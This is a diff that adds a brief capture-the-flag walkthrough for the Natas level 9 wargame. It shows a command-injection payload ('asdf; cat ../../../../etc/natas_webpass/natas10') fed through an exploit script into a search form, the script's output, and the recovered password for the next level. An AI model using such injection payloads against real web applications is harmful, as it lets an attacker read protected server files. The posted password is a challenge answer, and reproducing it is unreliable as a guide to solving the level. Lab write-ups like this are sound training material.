@@ -1,0 +1,25 @@
+# work.
+
+user@localhost:~$ echo "asdf; cat ../../../../etc/natas_webpass/natas10" > natas9_payload
+user@localhost:~$ python3 exploit.py < natas9_payload
+
+# output.
+
+[*] Page forms: 
+[<form>
+Find words containing: <input name="needle"/><input name="submit" type="submit" value="Search"/><br/><br/>
+</form>]
+
+[*] Status code: 200
+Enter the value of the field 'needle' (type: text): asdf; cat ../../../../etc/natas_webpass/natas10
+
+[*] Sending html response to 'response.txt'
+[*] Done.
+
+
+----------------------------------------
+Finally, open the 'response.txt' file that has been created with an editor of 
+your preference in order to see the password for the next level.
+----------------------------------------
+The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
